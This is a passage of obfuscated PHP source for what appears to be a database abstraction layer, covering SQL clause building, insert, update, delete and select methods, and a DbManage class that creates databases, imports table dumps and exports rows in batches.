unset($¯ÑµÂé¨[$“é¯ö„[1044]]); } else { $ÏÑÛóÌ = $“é¯ö„[1048]; } foreach ($¯ÑµÂé¨ as $ü‰ øœù => $±Æ×¾Ü×) { $“ƒ¸ƒ‚» .= $“é¯ö„[321]; if (is_numeric($ü‰ øœù)) { $ü‰ øœù = $“é¯ö„[1049]; } if (0 === strpos($ü‰ øœù, $“é¯ö„[11])) { $“ƒ¸ƒ‚» .= $this->parseThinkWhere($ü‰ øœù, $±Æ×¾Ü×); } else { if (!preg_match($“é¯ö„[1050], trim($ü‰ øœù))) { think_exception(think_lang($“é¯ö„[1051]) . $“é¯ö„[4] . $ü‰ øœù); } $±áõÉª = is_array($±Æ×¾Ü×) && isset($±Æ×¾Ü×[$“é¯ö„[1052]]); $ü‰ øœù = trim($ü‰ øœù); if (strpos($ü‰ øœù, $“é¯ö„[327])) { $ˆäƒÊ¿¤ = explode($“é¯ö„[327], $ü‰ øœù); $‘¬œ±Ó = array(); foreach ($ˆäƒÊ¿¤ as $ëâ¨æ¦  => $’“§Âè•) { $Õ¹ë = $±áõÉª ? $±Æ×¾Ü×[$ëâ¨æ¦ ] : $±Æ×¾Ü×; $‘¬œ±Ó[] = $“é¯ö„[304] . $this->parseWhereItem($this->parseKey($’“§Âè•), $Õ¹ë) . $“é¯ö„[949]; } $“ƒ¸ƒ‚» .= implode($“é¯ö„[1053], $‘¬œ±Ó); } elseif (strpos($ü‰ øœù, $“é¯ö„[328])) { $ˆäƒÊ¿¤ = explode($“é¯ö„[328], $ü‰ øœù); $‘¬œ±Ó = array(); foreach ($ˆäƒÊ¿¤ as $ëâ¨æ¦  => $’“§Âè•) { $Õ¹ë = $±áõÉª ? $±Æ×¾Ü×[$ëâ¨æ¦ ] : $±Æ×¾Ü×; $‘¬œ±Ó[] = $“é¯ö„[304] . $this->parseWhereItem($this->parseKey($’“§Âè•), $Õ¹ë) . $“é¯ö„[949]; } $“ƒ¸ƒ‚» .= implode($“é¯ö„[1048], $‘¬œ±Ó); } else { $“ƒ¸ƒ‚» .= $this->parseWhereItem($this->parseKey($ü‰ øœù), $±Æ×¾Ü×); } } $“ƒ¸ƒ‚» .= $“é¯ö„[322] . $ÏÑÛóÌ; } $“ƒ¸ƒ‚» = substr($“ƒ¸ƒ‚», 0, -strlen($ÏÑÛóÌ)); } return empty($“ƒ¸ƒ‚») ? $“é¯ö„[12] : $“é¯ö„[1054] . $“ƒ¸ƒ‚»; } protected function parseWhereItem($Ä‚™ÂÇÃ, $ãß·‘˜) { $¹öëÓéÉ =& $_SERVER[—ÌÒğš÷]; $Î‚Õ°Òš = $¹öëÓéÉ[12]; if (is_array($ãß·‘˜)) { if (is_string($ãß·‘˜[0])) { $½µù¸Ò‹ = strtolower($ãß·‘˜[0]); if (in_array($ãß·‘˜[0], array($¹öëÓéÉ[928], $¹öëÓéÉ[1055], $¹öëÓéÉ[1056], $¹öëÓéÉ[1057], $¹öëÓéÉ[1058], $¹öëÓéÉ[1059]))) { $Î‚Õ°Òš .= $Ä‚™ÂÇÃ . $¹öëÓéÉ[53] . $ãß·‘˜[0] . $¹öëÓéÉ[53] . $this->parseValue($ãß·‘˜[1]); } elseif (preg_match($¹öëÓéÉ[1060], $ãß·‘˜[0])) { $Î‚Õ°Òš .= $Ä‚™ÂÇÃ . $¹öëÓéÉ[53] . $this->exp[$½µù¸Ò‹] . $¹öëÓéÉ[53] . $this->parseValue($ãß·‘˜[1]); } elseif (preg_match($¹öëÓéÉ[1061], $ãß·‘˜[0])) { if (is_array($ãß·‘˜[1])) { $çØŒ—˜• = isset($ãß·‘˜[2]) ? strtoupper($ãß·‘˜[2]) : $¹öëÓéÉ[1046]; if (in_array($çØŒ—˜•, array($¹öëÓéÉ[1045], $¹öëÓéÉ[1046], $¹öëÓéÉ[1047]))) { $Ñµü±¸Õ = array(); foreach ($ãß·‘˜[1] as $öèë‡øá) { $Ñµü±¸Õ[] = $Ä‚™ÂÇÃ . $¹öëÓéÉ[53] . $this->exp[$½µù¸Ò‹] . $¹öëÓéÉ[53] . $this->parseValue($öèë‡øá); } $Î‚Õ°Òš .= $¹öëÓéÉ[304] . implode($¹öëÓéÉ[53] . $çØŒ—˜• . $¹öëÓéÉ[53], $Ñµü±¸Õ) . $¹öëÓéÉ[949]; } } else { $Î‚Õ°Òš .= $Ä‚™ÂÇÃ . $¹öëÓéÉ[53] . $this->exp[$½µù¸Ò‹] . $¹öëÓéÉ[53] . $this->parseValue($ãß·‘˜[1]); } } elseif ($¹öëÓéÉ[341] == $½µù¸Ò‹) { $Î‚Õ°Òš .= $¹öëÓéÉ[947] . $Ä‚™ÂÇÃ . $¹öëÓéÉ[53] . $ãß·‘˜[1] . $¹öëÓéÉ[1062]; } elseif (preg_match($¹öëÓéÉ[1063], $ãß·‘˜[0])) { $Î‚Õ°Òš .= $ãß·‘˜[0]; } elseif (preg_match($¹öëÓéÉ[1064], $ãß·‘˜[0])) { if (isset($ãß·‘˜[2]) && $¹öëÓéÉ[341] == $ãß·‘˜[2]) { $Î‚Õ°Òš .= $Ä‚™ÂÇÃ . $¹öëÓéÉ[53] . $this->exp[$½µù¸Ò‹] . $¹öëÓéÉ[53] . $ãß·‘˜[1]; } else { if (is_string($ãß·‘˜[1])) { $ãß·‘˜[1] = explode($¹öëÓéÉ[50], $ãß·‘˜[1]); } $´Íìæ‘ò = implode($¹öëÓéÉ[50], $this->parseValue($ãß·‘˜[1])); $Î‚Õ°Òš .= $Ä‚™ÂÇÃ . $¹öëÓéÉ[53] . $this->exp[$½µù¸Ò‹] . $¹öëÓéÉ[947] . $´Íìæ‘ò . $¹öëÓéÉ[949]; } } elseif (preg_match($¹öëÓéÉ[1065], $ãß·‘˜[0])) { $É‡Íåş = is_string($ãß·‘˜[1]) ? explode($¹öëÓéÉ[50], $ãß·‘˜[1]) : $ãß·‘˜[1]; $Î‚Õ°Òš .= $¹öëÓéÉ[947] . $Ä‚™ÂÇÃ . $¹öëÓéÉ[53] . $this->exp[$½µù¸Ò‹] . $¹öëÓéÉ[53] . $this->parseValue($É‡Íåş[0]) . $¹öëÓéÉ[1048] . $this->parseValue($É‡Íåş[1]) . $¹öëÓéÉ[322]; } else { think_exception(think_lang($¹öëÓéÉ[1051]) . $¹öëÓéÉ[4] . $ãß·‘˜[0]); } } else { $´Ï¼“’ = count($ãß·‘˜); $òïÊÖ„ª = $¹öëÓéÉ[12]; if (is_string($ãß·‘˜[$´Ï¼“’ - 1])) { $òïÊÖ„ª = isset($ãß·‘˜[$´Ï¼“’ - 1]) ? strtoupper($ãß·‘˜[$´Ï¼“’ - 1]) : $¹öëÓéÉ[12]; if (in_array($òïÊÖ„ª, array($¹öëÓéÉ[1045], $¹öëÓéÉ[1046], $¹öëÓéÉ[1047]))) { $´Ï¼“’ = $´Ï¼“’ - 1; } } else { $òïÊÖ„ª = $¹öëÓéÉ[1045]; } for ($‘õ×Ø—Ä = 0; $‘õ×Ø—Ä < $´Ï¼“’; $‘õ×Ø—Ä++) { $É‡Íåş = is_array($ãß·‘˜[$‘õ×Ø—Ä]) ? $ãß·‘˜[$‘õ×Ø—Ä][1] : $ãß·‘˜[$‘õ×Ø—Ä]; if ($¹öëÓéÉ[341] == strtolower($ãß·‘˜[$‘õ×Ø—Ä][0])) { $Î‚Õ°Òš .= $¹öëÓéÉ[304] . $Ä‚™ÂÇÃ . $¹öëÓéÉ[53] . $É‡Íåş . $¹öëÓéÉ[1062] . $òïÊÖ„ª . $¹öëÓéÉ[53]; } else { $Ó‡·éÖ = is_array($ãß·‘˜[$‘õ×Ø—Ä]) ? $this->exp[strtolower($ãß·‘˜[$‘õ×Ø—Ä][0])] : $¹öëÓéÉ[928]; if (!$Ó‡·éÖ && is_array($ãß·‘˜[$‘õ×Ø—Ä]) && in_array($ãß·‘˜[$‘õ×Ø—Ä][0], array($¹öëÓéÉ[928], $¹öëÓéÉ[1055], $¹öëÓéÉ[1056], $¹öëÓéÉ[1057], $¹öëÓéÉ[1058], $¹öëÓéÉ[1059]))) { $Ó‡·éÖ = $ãß·‘˜[$‘õ×Ø—Ä][0]; } $Î‚Õ°Òš .= $¹öëÓéÉ[304] . $Ä‚™ÂÇÃ . $¹öëÓéÉ[53] . $Ó‡·éÖ . $¹öëÓéÉ[53] . $this->parseValue($É‡Íåş) . $¹öëÓéÉ[1062] . $òïÊÖ„ª . $¹öëÓéÉ[53]; } } $Î‚Õ°Òš = substr($Î‚Õ°Òš, 0, -4); } } else { $Î‚Õ°Òš .= $Ä‚™ÂÇÃ . $¹öëÓéÉ[1066] . $this->parseValue($ãß·‘˜); } return $Î‚Õ°Òš; } protected function parseThinkWhere($§ÍË÷Âà, $Ç™şÄá“) { $æŞ«ğØ­ =& $_SERVER[—ÌÒğš÷]; $Ò†³æÖÉ = $æŞ«ğØ­[12]; switch ($§ÍË÷Âà) { case $æŞ«ğØ­[396]: $Ò†³æÖÉ = $Ç™şÄá“; break; case $æŞ«ğØ­[1049]: $Ò†³æÖÉ = is_string($Ç™şÄá“) ? $Ç™şÄá“ : substr($this->parseWhere($Ç™şÄá“), 6); break; case $æŞ«ğØ­[1067]: parse_str($Ç™şÄá“, $®ƒşÇ˜); if (isset($®ƒşÇ˜[$æŞ«ğØ­[1044]])) { $ªÛè•Æ = $æŞ«ğØ­[53] . strtoupper($®ƒşÇ˜[$æŞ«ğØ­[1044]]) . $æŞ«ğØ­[53]; unset($®ƒşÇ˜[$æŞ«ğØ­[1044]]); } else { $ªÛè•Æ = $æŞ«ğØ­[1048]; } $İ³µŒøí = array(); foreach ($®ƒşÇ˜ as $ê®õÑÚ¿ => $³Ö™·ÂÀ) { $İ³µŒøí[] = $this->parseKey($ê®õÑÚ¿) . $æŞ«ğØ­[1066] . $this->parseValue($³Ö™·ÂÀ); } $Ò†³æÖÉ = implode($ªÛè•Æ, $İ³µŒøí); break; } return $Ò†³æÖÉ; } protected function parseLimit($£œÀµ·) { $¯ÜğÑâ‘ =& $_SERVER[—ÌÒğš÷]; return !empty($£œÀµ·) ? $¯ÜğÑâ‘[51] . $£œÀµ· . $¯ÜğÑâ‘[53] : $¯ÜğÑâ‘[12]; } protected function parseJoin($Ú¯Ş¶º…) { $¼„‘¦Ï› =& $_SERVER[—ÌÒğš÷]; $·î€Ú‚ = $¼„‘¦Ï›[12]; if (!empty($Ú¯Ş¶º…)) { if (is_array($Ú¯Ş¶º…)) { foreach ($Ú¯Ş¶º… as $ªƒüÏ± => $º«ƒƒ÷€) { if (!1 !== stripos($º«ƒƒ÷€, $¼„‘¦Ï›[1068])) { $·î€Ú‚ .= $¼„‘¦Ï›[53] . $º«ƒƒ÷€; } else { $·î€Ú‚ .= $¼„‘¦Ï›[1069] . $º«ƒƒ÷€; } } } else { $·î€Ú‚ .= $¼„‘¦Ï›[1069] . $Ú¯Ş¶º…; } } $·î€Ú‚ = preg_replace($¼„‘¦Ï›[1070], think_config($¼„‘¦Ï›[974]) . $¼„‘¦Ï›[1071], $·î€Ú‚); return $·î€Ú‚; } protected function parseOrder($ÎÀ¿íÜ) { $êØ©êÎ  =& $_SERVER[—ÌÒğš÷]; if (is_array($ÎÀ¿íÜ)) { $¾•Ù = array(); foreach ($ÎÀ¿íÜ as $é˜˜ù¥¹ => $¶ØõÄÊµ) { if (is_numeric($é˜˜ù¥¹)) { $¾•Ù[] = $this->parseKey($¶ØõÄÊµ); } else { $¶ØõÄÊµ = in_array(strtoupper(trim($¶ØõÄÊµ)), array($êØ©êÎ [1072], $êØ©êÎ [1073])) ? $êØ©êÎ [53] . $¶ØõÄÊµ : $êØ©êÎ [12]; if (preg_match($êØ©êÎ [1074], $é˜˜ù¥¹)) { $¾•Ù[] = $this->parseKey($é˜˜ù¥¹) . $¶ØõÄÊµ; } else { think_exception($êØ©êÎ [1075] . $é˜˜ù¥¹); } } } $ÎÀ¿íÜ = implode($êØ©êÎ [50], $¾•Ù); } return !empty($ÎÀ¿íÜ) ? $êØ©êÎ [1076] . $ÎÀ¿íÜ : $êØ©êÎ [12]; } protected function parseGroup($¾ä¿É±û) { $ùª„¦Ç› =& $_SERVER[—ÌÒğš÷]; return !empty($¾ä¿É±û) ? $ùª„¦Ç›[1077] . $¾ä¿É±û : $ùª„¦Ç›[12]; } protected function parseHaving($˜Ïôèßƒ) { $óô¬½òÇ =& $_SERVER[—ÌÒğš÷]; return !empty($˜Ïôèßƒ) ? $óô¬½òÇ[1078] . $˜Ïôèßƒ : $óô¬½òÇ[12]; } protected function parseComment($ãÔÂÑÎæ) { $’›Éïá• =& $_SERVER[—ÌÒğš÷]; return !empty($ãÔÂÑÎæ) ? $’›Éïá•[1079] . $ãÔÂÑÎæ . $’›Éïá•[1080] : $’›Éïá•[12]; } protected function parseDistinct($·è”ã€­) { $¤ƒàÕ =& $_SERVER[—ÌÒğš÷]; return !empty($·è”ã€­) ? $¤ƒàÕ[1081] : $¤ƒàÕ[12]; } protected function parseUnion($•¯‹¹ãÍ) { $É³¹‹íì =& $_SERVER[—ÌÒğš÷]; if (empty($•¯‹¹ãÍ)) { return $É³¹‹íì[12]; } if (isset($•¯‹¹ãÍ[$É³¹‹íì[392]])) { $ëÚ­¦å² = $É³¹‹íì[1082]; unset($•¯‹¹ãÍ[$É³¹‹íì[392]]); } else { $ëÚ­¦å² = $É³¹‹íì[1083]; } foreach ($•¯‹¹ãÍ as $ŸÌ§Ÿã¦) { $ ôÊ•©°[] = $ëÚ­¦å² . (is_array($ŸÌ§Ÿã¦) ? $this->buildSelectSql($ŸÌ§Ÿã¦) : $ŸÌ§Ÿã¦); } return implode($É³¹‹íì[53], $ ôÊ•©°); } public function insert($©çéê, $¸ÀƒÇ˜ª = array(), $¡¨š¯¾Ş = false) { $³†Êæø =& $_SERVER[—ÌÒğš÷]; $²›ïİ¦é = $Û«—”ä = array(); $this->model = $¸ÀƒÇ˜ª[$³†Êæø[325]]; foreach ($©çéê as $Íƒ«ğ³‹ => $™’ñ¬ŒÎ) { if (is_array($™’ñ¬ŒÎ) && $³†Êæø[341] == $™’ñ¬ŒÎ[0]) { $Û«—”ä[] = $this->parseKey($Íƒ«ğ³‹); $²›ïİ¦é[] = $™’ñ¬ŒÎ[1]; } elseif (is_scalar($™’ñ¬ŒÎ) || is_null($™’ñ¬ŒÎ)) { $Û«—”ä[] = $this->parseKey($Íƒ«ğ³‹); $²›ïİ¦é[] = $this->parseValue($™’ñ¬ŒÎ); } } $’”çæšƒ = ($¡¨š¯¾Ş ? $³†Êæø[951] : $³†Êæø[952]) . $³†Êæø[953] . $this->parseTable($¸ÀƒÇ˜ª[$³†Êæø[323]]) . $³†Êæø[947] . implode($³†Êæø[50], $Û«—”ä) . $³†Êæø[948] . implode($³†Êæø[50], $²›ïİ¦é) . $³†Êæø[949]; $’”çæšƒ .= $this->parseLock(isset($¸ÀƒÇ˜ª[$³†Êæø[888]]) ? $¸ÀƒÇ˜ª[$³†Êæø[888]] : !1); $’”çæšƒ .= $this->parseComment(!empty($¸ÀƒÇ˜ª[$³†Êæø[398]]) ? $¸ÀƒÇ˜ª[$³†Êæø[398]] : $³†Êæø[12]); return $this->execute($’”çæšƒ, $this->parseBind(!empty($¸ÀƒÇ˜ª[$³†Êæø[329]]) ? $¸ÀƒÇ˜ª[$³†Êæø[329]] : array())); } public function selectInsert($ó¢ÙáÀÅ, $û¼’ìë…, $ïØèã½± = array()) { $¥§ƒÑõª =& $_SERVER[—ÌÒğš÷]; $this->model = $ïØèã½±[$¥§ƒÑõª[325]]; if (is_string($ó¢ÙáÀÅ)) { $ó¢ÙáÀÅ = explode($¥§ƒÑõª[50], $ó¢ÙáÀÅ); } array_walk($ó¢ÙáÀÅ, array($this, $¥§ƒÑõª[950])); $éÉÖù¤À = $¥§ƒÑõª[1084] . $this->parseTable($û¼’ìë…) . $¥§ƒÑõª[947] . implode($¥§ƒÑõª[50], $ó¢ÙáÀÅ) . $¥§ƒÑõª[1062]; $éÉÖù¤À .= $this->buildSelectSql($ïØèã½±); return $this->execute($éÉÖù¤À, $this->parseBind(!empty($ïØèã½±[$¥§ƒÑõª[329]]) ? $ïØèã½±[$¥§ƒÑõª[329]] : array())); } public function update($Ûè±ã¤ö, $ü×ºÏòÂ) { $ó®îëğí =& $_SERVER[—ÌÒğš÷]; $this->model = $ü×ºÏòÂ[$ó®îëğí[325]]; $ãøÑ¨éš = $ó®îëğí[1085] . $this->parseTable($ü×ºÏòÂ[$ó®îëğí[323]]) . $this->parseSet($Ûè±ã¤ö) . $this->parseWhere(!empty($ü×ºÏòÂ[$ó®îëğí[319]]) ? $ü×ºÏòÂ[$ó®îëğí[319]] : $ó®îëğí[12]) . $this->parseOrder(!empty($ü×ºÏòÂ[$ó®îëğí[409]]) ? $ü×ºÏòÂ[$ó®îëğí[409]] : $ó®îëğí[12]) . $this->parseLimit(!empty($ü×ºÏòÂ[$ó®îëğí[336]]) ? $ü×ºÏòÂ[$ó®îëğí[336]] : $ó®îëğí[12]) . $this->parseLock(isset($ü×ºÏòÂ[$ó®îëğí[888]]) ? $ü×ºÏòÂ[$ó®îëğí[888]] : !1) . $this->parseComment(!empty($ü×ºÏòÂ[$ó®îëğí[398]]) ? $ü×ºÏòÂ[$ó®îëğí[398]] : $ó®îëğí[12]); return $this->execute($ãøÑ¨éš, $this->parseBind(!empty($ü×ºÏòÂ[$ó®îëğí[329]]) ? $ü×ºÏòÂ[$ó®îëğí[329]] : array())); } public function delete($ÄÚ–´şâ = array()) { $„çõ¿™ =& $_SERVER[—ÌÒğš÷]; $this->model = $ÄÚ–´şâ[$„çõ¿™[325]]; $ç¶Ş­¥³ = $„çõ¿™[1086] . $this->parseTable($ÄÚ–´şâ[$„çõ¿™[323]]) . $this->parseWhere(!empty($ÄÚ–´şâ[$„çõ¿™[319]]) ? $ÄÚ–´şâ[$„çõ¿™[319]] : $„çõ¿™[12]) . $this->parseOrder(!empty($ÄÚ–´şâ[$„çõ¿™[409]]) ? $ÄÚ–´şâ[$„çõ¿™[409]] : $„çõ¿™[12]) . $this->parseLimit(!empty($ÄÚ–´şâ[$„çõ¿™[336]]) ? $ÄÚ–´şâ[$„çõ¿™[336]] : $„çõ¿™[12]) . $this->parseLock(isset($ÄÚ–´şâ[$„çõ¿™[888]]) ? $ÄÚ–´şâ[$„çõ¿™[888]] : !1) . $this->parseComment(!empty($ÄÚ–´şâ[$„çõ¿™[398]]) ? $ÄÚ–´şâ[$„çõ¿™[398]] : $„çõ¿™[12]); return $this->execute($ç¶Ş­¥³, $this->parseBind(!empty($ÄÚ–´şâ[$„çõ¿™[329]]) ? $ÄÚ–´şâ[$„çõ¿™[329]] : array())); } public function select($—™¬ªˆ‡ = array()) { $ñÀ¬”¶ =& $_SERVER[—ÌÒğš÷]; $this->model = $—™¬ªˆ‡[$ñÀ¬”¶[325]]; $‰äÉòßË = $this->buildSelectSql($—™¬ªˆ‡); $¤ÎùŒÃ = isset($—™¬ªˆ‡[$ñÀ¬”¶[393]]) ? $—™¬ªˆ‡[$ñÀ¬”¶[393]] : !1; if ($¤ÎùŒÃ) { $Î£¬ÓÎÑ = is_string($¤ÎùŒÃ[$ñÀ¬”¶[94]]) ? $¤ÎùŒÃ[$ñÀ¬”¶[94]] : $ñÀ¬”¶[1087] . md5($‰äÉòßË); $ÆÅÃŒ—Ï = think_cache($Î£¬ÓÎÑ, $ñÀ¬”¶[12], $¤ÎùŒÃ); if (!1 !== $ÆÅÃŒ—Ï) { return $ÆÅÃŒ—Ï; } } $Ì±¼Àù = $this->query($‰äÉòßË, $this->parseBind(!empty($—™¬ªˆ‡[$ñÀ¬”¶[329]]) ? $—™¬ªˆ‡[$ñÀ¬”¶[329]] : array())); if ($¤ÎùŒÃ && !1 !== $Ì±¼Àù) { think_cache($Î£¬ÓÎÑ, $Ì±¼Àù, $¤ÎùŒÃ); } return $Ì±¼Àù; } public function buildSelectSql($µß×ï±´ = array()) { $ÖÂü =& $_SERVER[—ÌÒğš÷]; if (isset($µß×ï±´[$ÖÂü[397]])) { if (strpos($µß×ï±´[$ÖÂü[397]], $ÖÂü[50])) { list($§ïà²Ú’, $º°‚¸¸ª) = explode($ÖÂü[50], $µß×ï±´[$ÖÂü[397]]); } else { $§ïà²Ú’ = $µß×ï±´[$ÖÂü[397]]; } $§ïà²Ú’ = $§ïà²Ú’ ? $§ïà²Ú’ : 1; $º°‚¸¸ª = isset($º°‚¸¸ª) ? $º°‚¸¸ª : (is_numeric($µß×ï±´[$ÖÂü[336]]) ? $µß×ï±´[$ÖÂü[336]] : 20); $Ñ°¬µ¨“ = $º°‚¸¸ª * ((int) $§ïà²Ú’ - 1); $µß×ï±´[$ÖÂü[336]] = $Ñ°¬µ¨“ . $ÖÂü[50] . $º°‚¸¸ª; } if (think_config($ÖÂü[1088])) { $¡¿íÊ€é = $ÖÂü[1089] . md5(serialize($µß×ï±´)); $šƒá¶¥· = think_cache($¡¿íÊ€é); if ($šƒá¶¥·) { return $šƒá¶¥·; } } $¦°¸°á = $this->parseSql($this->selectSql, $µß×ï±´); $¦°¸°á .= $this->parseLock(isset($µß×ï±´[$ÖÂü[888]]) ? $µß×ï±´[$ÖÂü[888]] : !1); if (isset($¡¿íÊ€é)) { think_cache($¡¿íÊ€é, $¦°¸°á); } return $¦°¸°á; } public function parseSql($ÌªÍÚ˜“, $€«²œôÏ = array()) { $¬µ•Š¦› =& $_SERVER[—ÌÒğš÷]; $ÌªÍÚ˜“ = str_replace(array($¬µ•Š¦›[1090], $¬µ•Š¦›[1091], $¬µ•Š¦›[1092], $¬µ•Š¦›[1093], $¬µ•Š¦›[1094], $¬µ•Š¦›[1095], $¬µ•Š¦›[1096], $¬µ•Š¦›[1097], $¬µ•Š¦›[1098], $¬µ•Š¦›[1099], $¬µ•Š¦›[1100]), array($this->parseTable("{$€«²œôÏ[$¬µ•Š¦›[323]]}"), $this->parseDistinct(isset($€«²œôÏ[$¬µ•Š¦›[1101]]) ? $€«²œôÏ[$¬µ•Š¦›[1101]] : !1), $this->parseField(!empty($€«²œôÏ[$¬µ•Š¦›[317]]) ? $€«²œôÏ[$¬µ•Š¦›[317]] : $¬µ•Š¦›[203]), $this->parseJoin(!empty($€«²œôÏ[$¬µ•Š¦›[326]]) ? $€«²œôÏ[$¬µ•Š¦›[326]] : $¬µ•Š¦›[12]), $this->parseWhere(!empty($€«²œôÏ[$¬µ•Š¦›[319]]) ? $€«²œôÏ[$¬µ•Š¦›[319]] : $¬µ•Š¦›[12]), $this->parseGroup(!empty($€«²œôÏ[$¬µ•Š¦›[547]]) ? $€«²œôÏ[$¬µ•Š¦›[547]] : $¬µ•Š¦›[12]), $this->parseHaving(!empty($€«²œôÏ[$¬µ•Š¦›[1102]]) ? $€«²œôÏ[$¬µ•Š¦›[1102]] : $¬µ•Š¦›[12]), $this->parseOrder(!empty($€«²œôÏ[$¬µ•Š¦›[409]]) ? $€«²œôÏ[$¬µ•Š¦›[409]] : $¬µ•Š¦›[12]), $this->parseLimit(!empty($€«²œôÏ[$¬µ•Š¦›[336]]) ? $€«²œôÏ[$¬µ•Š¦›[336]] : $¬µ•Š¦›[12]), $this->parseUnion(!empty($€«²œôÏ[$¬µ•Š¦›[391]]) ? $€«²œôÏ[$¬µ•Š¦›[391]] : $¬µ•Š¦›[12]), $this->parseComment(!empty($€«²œôÏ[$¬µ•Š¦›[398]]) ? $€«²œôÏ[$¬µ•Š¦›[398]] : $¬µ•Š¦›[12])), $ÌªÍÚ˜“); return $ÌªÍÚ˜“; } public function getLastSql($åÛáİş— = '') { return $åÛáİş— ? $this->modelSql[$åÛáİş—] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Î‡Ää÷ì) { return addslashes($Î‡Ää÷ì); } public function setModel($¬ĞÕ¥ÆÌ) { $this->model = $¬ĞÕ¥ÆÌ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Ê×üªÁÔ = array()) { $‡«İú³Î =& $_SERVER[—ÌÒğš÷]; if (empty($Ê×üªÁÔ)) { $Ê×üªÁÔ = $GLOBALS[$‡«İú³Î[6]][$‡«İú³Î[21]]; } $this->database = $Ê×üªÁÔ; } public function model($˜œ—Ó³• = '') { return new ModelBase($˜œ—Ó³•, $_SERVER[—ÌÒğš÷][12], $this->database); } public function db($¤İ¤©áì = false) { $Ø“­Ê¿ =& $_SERVER[—ÌÒğš÷]; $€ò°ãôÄ = array_change_key_case($this->database); if ($this->dbType() == $Ø“­Ê¿[13] || !$¤İ¤©áì) { return $this->model()->db(); } $Õç…¼´ê = $€ò°ãôÄ[$Ø“­Ê¿[1016]]; $€ò°ãôÄ[$Ø“­Ê¿[1016]] = $Ø“­Ê¿[12]; if ($€ò°ãôÄ[$Ø“­Ê¿[1011]] == $Ø“­Ê¿[1008]) { $òäÌ£íè = $€ò°ãôÄ[$Ø“­Ê¿[1017]]; $€ò°ãôÄ[$Ø“­Ê¿[1017]] = substr($òäÌ£íè, 0, strrpos($òäÌ£íè, $Ø“­Ê¿[1103])); } $this->database = $€ò°ãôÄ; $Åé€›‚« = $this->model()->db(); try { $€¹ƒâ‹Ä = $Åé€›‚«->execute("\163\150\x6f\167\40\144\x61\164\141\142\x61\x73\145\163\40\x6c\x69\153\145\40\x27{$Õç…¼´ê}\x27"); } catch (Exception $Î¯™½ÖÆ) { } if (!$€¹ƒâ‹Ä) { $Åé€›‚«->execute("\143\162\145\x61\x74\x65\x20\x64\x61\164\141\x62\141\163\x65\x20\x60{$Õç…¼´ê}\x60"); } $€ò°ãôÄ[$Ø“­Ê¿[1016]] = $Õç…¼´ê; if ($€ò°ãôÄ[$Ø“­Ê¿[1011]] == $Ø“­Ê¿[1008]) { $€ò°ãôÄ[$Ø“­Ê¿[1017]] .= $Ø“­Ê¿[1103] . $Õç…¼´ê; } $this->database = $€ò°ãôÄ; $Åé€›‚«->execute("\165\163\145\x20\140{$Õç…¼´ê}\140"); return $Åé€›‚«; } public function createTable($¸šĞÙ¨€, &$½‰¢Ä“Û) { $‡ŒÔŒ”× =& $_SERVER[—ÌÒğš÷]; if (!IO::exist($¸šĞÙ¨€)) { ActionCall($‡ŒÔŒ”×[1104], !0, 0); show_json(LNG($‡ŒÔŒ”×[1105]), !1); } $†‚¶Ş¼± = $this->model()->db(); $ÛäÕÛë® = sqlSplit(IO::getContent($¸šĞÙ¨€)); foreach ($ÛäÕÛë® as $êŠŒ­úÇ) { $Ú²’º£ = stripos($êŠŒ­úÇ, $‡ŒÔŒ”×[1106]) === 0; if ($Ú²’º£) { $½‰¢Ä“Û->task[$‡ŒÔŒ”×[822]] += 1; } $†‚¶Ş¼±->execute($êŠŒ­úÇ); if ($Ú²’º£) { preg_match($‡ŒÔŒ”×[1107], $êŠŒ­úÇ, $´Ê˜¯Â); $½‰¢Ä“Û->task[$‡ŒÔŒ”×[1108]] = $´Ê˜¯Â[1]; $½‰¢Ä“Û->update(1); } } } public function insertTable($øÏêÎ£Ò, &$ÄŠÓ¥·) { $±ªÌàÏ =& $_SERVER[—ÌÒğš÷]; $³ß˜õ’ı = $this->model()->db(); $· Û³È‚ = $İ¤Ä‘Ì ? array($İ¤Ä‘Ì) : $³ß˜õ’ı->getTables(); foreach ($øÏêÎ£Ò as $„ÖŒŞ½) { $İ¤Ä‘Ì = basename($„ÖŒŞ½, $±ªÌàÏ[824]); if (!in_array($İ¤Ä‘Ì, $· Û³È‚)) { continue; } $ÄŠÓ¥·->task[$±ªÌàÏ[1108]] = $İ¤Ä‘Ì; if (get_filesize($„ÖŒŞ½) == 0) { continue; } $•²™Ì€À = $this->sqlToDb($„ÖŒŞ½, $ÄŠÓ¥·); if (!$•²™Ì€À) { ActionCall($±ªÌàÏ[1104], !0, 0); show_json(LNG($±ªÌàÏ[1109]) . "\133{$İ¤Ä‘Ì}\135", !1); } } } public function sqlFromDb($ÆÊ’», $ü¶Ğ»Æ¯, &$”ß½æèÏ, $‡Ö¾ëƒ = '') { if ($”ß½æèÏ) { $”ß½æèÏ->task[$_SERVER[—ÌÒğš÷][1108]] = $ÆÊ’»; } $ƒ¸÷×÷İ = $this->model($ÆÊ’»); $éŠ¦üî¤ = 0; $‚½„‰ÅÒ = 0; $ïèó×­Õ = 10000; $Ú‘µÖ‚¼ = fopen($ü¶Ğ»Æ¯, $_SERVER[—ÌÒğš÷][1110]); $òŒ‡¤•Ø = $ƒ¸÷×÷İ->getPk(); $şü‚îš¼ = $ƒ¸÷×÷İ->getDbFields(); $…™Úüîí = $_SERVER[—ÌÒğš÷][12]; if ($GLOBALS[$_SERVER[—ÌÒğš÷][823]] && in_array($ÆÊ’», array($_SERVER[—ÌÒğš÷][1111], $_SERVER[—ÌÒğš÷][1112]))) { $…™Úüîí = $ÆÊ’»; } do { $êÄÇ¥í = array($òŒ‡¤•Ø => array($_SERVER[—ÌÒğš÷][1058], $‚½„‰ÅÒ)); $ªö“»ß = $ƒ¸÷×÷İ->where($êÄÇ¥í)->field($şü‚îš¼)->order($òŒ‡¤•Ø . $_SERVER[—ÌÒğš÷][1113])->limit($ïèó×­Õ)->select(); $ªö“»ß = !empty($ªö“»ß) ? $ªö“»ß : array(); if (!($Ö³°Ûê• = count($ªö“»ß))) { break; } $˜Ì—ÍÄä = end($ªö“»ß); $‚½„‰ÅÒ = $˜Ì—ÍÄä[$òŒ‡¤•Ø]; $È³Üà¼¥ = array(); foreach ($ªö“»ß as $—ä±–á) { if ($…™Úüîí) { if ($ÆÊ’» == $_SERVER[—ÌÒğš÷][1111]) { if ($—ä±–á[$_SERVER[—ÌÒğš÷][33]] == $_SERVER[—ÌÒğš÷][1114]) { $Æ»„‚¸ = 